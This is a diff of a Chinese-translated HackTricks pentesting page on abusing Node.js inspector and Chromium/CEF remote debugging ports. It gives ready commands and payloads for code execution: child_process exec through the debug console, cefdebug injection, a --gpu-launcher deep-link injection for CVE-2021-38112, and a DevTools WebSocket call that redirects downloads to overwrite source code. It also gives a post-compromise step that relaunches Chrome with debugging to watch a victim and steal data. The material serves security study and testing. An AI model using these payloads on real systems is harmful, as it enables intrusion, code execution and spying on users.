@@ -1,30 +1,30 @@
-# Node inspector/CEF 调试滥用
+# Node inspector/CEF debug abuse
 
 <details>
 
-<summary><strong>从零到英雄学习 AWS 黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-支持 HackTricks 的其他方式：
+其他支持HackTricks的方式：
 
-* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 ## 基本信息
 
-使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。**默认情况下**，它将在主机和端口 **`127.0.0.1:9229`** 上监听。每个进程也会被分配一个**唯一的** **UUID**。
+[从文档中获取](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): 当使用`--inspect`开关启动时，Node.js进程会监听调试客户端。**默认情况下**，它会在主机和端口**`127.0.0.1:9229`**上进行监听。每个进程还会被分配一个**唯一的UUID**。
 
-Inspector 客户端必须知道并指定主机地址、端口和 UUID 才能连接。完整的 URL 看起来像这样 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。
+检查器客户端必须知道并指定主机地址、端口和UUID才能连接。完整的URL看起来像`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。
 
 {% hint style="warning" %}
-由于 **调试器可以完全访问 Node.js 执行环境**，能够连接到此端口的恶意行为者可能能够代表 Node.js 进程执行任意代码（**潜在的权限提升**）。
+由于**调试器可以完全访问Node.js执行环境**，一个恶意行为者能够连接到这个端口，可能能够代表Node.js进程执行任意代码（**潜在的权限提升**）。
 {% endhint %}
 
-有几种方法可以启动 inspector：
+有几种启动检查器的方式：
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -35,50 +35,50 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-当您启动一个被检查的进程时，会出现类似这样的内容：
+当您启动一个被检查的进程时，会出现类似以下内容：
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-基于 **CEF** (**Chromium Embedded Framework**) 的进程需要使用参数：`--remote-debugging-port=9222` 来打开**调试器**（SSRF 保护措施仍然非常相似）。然而，它们**不是**提供一个 **NodeJS** **调试**会话，而是会使用 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器通信，这是一个控制浏览器的接口，但并没有直接的 RCE。
+基于**CEF**（**Chromium嵌入式框架**）的进程需要使用参数：`--remote-debugging-port=9222`来打开**调试器**（SSRF保护保持非常相似）。然而，它们不会授予一个**NodeJS** **调试**会话，而是使用[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)与浏览器通信，这是一个控制浏览器的接口，但没有直接的RCE。
 
-当你启动一个被调试的浏览器时，会出现类似这样的内容：
+当您启动一个被调试的浏览器时，会出现类似以下内容：
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
 ### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-在网页浏览器中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。需要一个**初始的 HTTP 连接**来**获取唯一的调试器会话 ID**。**同源策略**阻止网站能够建立**此 HTTP 连接**。为了增加安全性，防止[**DNS 重绑定攻击**](https://en.wikipedia.org/wiki/DNS\_rebinding)，Node.js 验证连接的**'Host' 头部**要么指定一个**IP 地址**，要么精确指定**`localhost`** 或 **`localhost6`**。
+在 Web 浏览器中打开的网站可以在浏览器安全模型下进行 WebSocket 和 HTTP 请求。**初始 HTTP 连接**是必要的，以**获取唯一的调试器会话 ID**。**同源策略** **阻止**网站能够进行**此 HTTP 连接**。为了进一步防范[**DNS 重绑定攻击**](https://en.wikipedia.org/wiki/DNS\_rebinding)**，**Node.js 验证连接的**'Host' 标头**是否明确指定了**IP 地址**或**`localhost`**或**`localhost6`**。
 
 {% hint style="info" %}
-这项**安全措施防止了利用检查器执行代码**，仅通过**发送 HTTP 请求**（这可以通过利用 SSRF 漏洞来完成）。
+这些**安全措施防止利用检查器**通过**仅发送 HTTP 请求**来运行代码（这可以利用 SSRF 漏洞来完成）。
 {% endhint %}
 
-### 在运行中的进程启动检查器
+### 在运行中的进程中启动检查器
 
-你可以向运行中的 nodejs 进程发送**信号 SIGUSR1**，使其在默认端口**启动检查器**。然而，请注意，你需要有足够的权限，所以这可能会授予你**访问进程内部信息的特权**，但不直接提升权限。
+您可以向运行中的 nodejs 进程发送**信号 SIGUSR1**，使其**在默认端口启动检查器**。但是，请注意您需要具有足够的特权，因此这可能会授予您**访问进程内部信息的特权**，但不会直接提升特权。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 {% hint style="info" %}
-这在容器中很有用，因为**关闭进程并以 `--inspect` 启动新进程**不是一个选项，因为**容器**会随着进程一起被**终止**。
+这在容器中非常有用，因为使用 `--inspect` 关闭进程并启动一个新进程**不是一个选择**，因为**容器**将随着进程被**终止**。
 {% endhint %}
 
 ### 连接到检查器/调试器
 
-如果您可以访问基于**Chromium**的浏览器，您可以通过在 Chrome 中访问 `chrome://inspect` 或在 Edge 中访问 `edge://inspect` 来连接。点击配置按钮并确保您的**目标主机和端口**被列出（在下一节的示例中找到如何使用其中一个示例获取 RCE 的示例图片）。
+要连接到基于**Chromium的浏览器**，可以访问 `chrome://inspect` 或 `edge://inspect` URL 以分别针对 Chrome 或 Edge。通过单击配置按钮，应确保**目标主机和端口**已正确列出。下图显示了一个远程代码执行（RCE）示例：
 
 ![](<../../.gitbook/assets/image (620) (1).png>)
 
-使用**命令行**，您可以连接到调试器/检查器：
+使用**命令行**可以连接到调试器/检查器：
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)，允许**查找**本地运行的**inspectors**并**注入代码**。
+该工具[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)允许**查找**本地运行的**检查器**并**注入代码**进入其中。
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -88,42 +88,40 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-请注意，如果通过[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)连接到浏览器，**NodeJS RCE漏洞利用将不起作用**（您需要检查API以找到有趣的事情来使用它）。
+请注意，如果通过[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)连接到浏览器，**NodeJS RCE exploits**将无法运行（您需要检查API以找到有趣的操作）。
 {% endhint %}
 
 ## NodeJS调试器/检查器中的RCE
 
 {% hint style="info" %}
-如果您是来这里寻找如何从Electron中的XSS获取[**RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
+如果您是来这里查找如何从Electron中的XSS获取[**RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 {% endhint %}
 
-当您可以**连接**到Node**检查器**时，一些常见的获取**RCE**的方法是使用类似的东西（看起来这在连接到Chrome DevTools协议时**不会起作用**）：
+一些常见的获得**RCE**的方法是当您可以**连接**到Node **检查器**时使用类似以下内容（看起来这在连接到Chrome DevTools协议时**不起作用**）：
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
 require('child_process').spawnSync('calc.exe')
 Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
 ```
-## Chrome DevTools 协议有效载荷
+## Chrome DevTools Protocol Payloads
 
-您可以在此处检查 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-在本节中，我将仅列出我发现人们用来利用此协议的有趣事物。
+您可以在此处查看API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+在本节中，我将列出我发现的人们用来利用此协议的有趣内容。
 
-### 通过深度链接的参数注入
+### 通过深度链接进行参数注入
 
-在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino 安全发现基于 CEF 的应用程序**在系统中注册了一个自定义 URI**（workspaces://），它接收完整的 URI，然后**启动基于 CEF 的应用程序**，其配置部分是根据该 URI 构建的。
+在[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)中，犀牛安全发现基于CEF的应用程序在系统中注册了一个自定义URI（workspaces://），该URI接收完整的URI，然后使用部分构建自该URI的配置来启动基于CEF的应用程序。
 
-研究发现，URI 参数被 URL 解码并用于启动基于 CEF 的应用程序，允许用户在**命令行**中**注入**标志 **`--gpu-launcher`** 并执行任意内容。
+发现URI参数被URL解码并用于启动CEF基本应用程序，允许用户在**命令行**中**注入**标志**`--gpu-launcher`**并执行任意操作。
 
-因此，像这样的有效载荷：
+因此，一个类似的有效负载：
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
-将执行 calc.exe。
-
 ### 覆盖文件
 
-更改**下载文件保存的文件夹**，并下载文件以**覆盖**应用程序中经常使用的**源代码**，用您的**恶意代码**。
+更改**下载文件保存位置**的文件夹，并下载一个文件，用你的**恶意代码**覆盖应用程序经常使用的**源代码**。
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -135,15 +133,15 @@ downloadPath: '/code/'
 }
 }));
 ```
-### Webdriver RCE 和 数据泄露
+### Webdriver RCE and exfiltration
 
-根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以实现 RCE 并从 theriver 泄露内部页面。
+根据这篇文章: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) 可以获得RCE并从theriver中泄露内部页面。
 
-### 后期利用
+### 后渗透
 
-在真实环境中，**在攻破**使用基于 Chrome/Chromium 浏览器的用户 PC 后，你可以启动一个带有**调试激活的 Chrome 进程并端口转发调试端口**，这样你就可以访问它。通过这种方式，你将能够**检查受害者使用 Chrome 时的所有操作并窃取敏感信息**。
+在真实环境中，**在入侵了使用Chrome/Chromium浏览器的用户PC后**，您可以启动一个带有**调试功能并进行端口转发的Chrome进程**，以便访问它。这样，您将能够**检查受害者在Chrome中的所有操作并窃取敏感信息**。
 
-隐蔽的方法是**终止所有 Chrome 进程**，然后调用类似
+隐秘的方法是**终止每个Chrome进程**，然后调用类似以下内容:
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
@@ -162,14 +160,14 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 
 <details>
 
-<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击技巧！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在**HackTricks**中看到您的**公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。 
 
 </details>
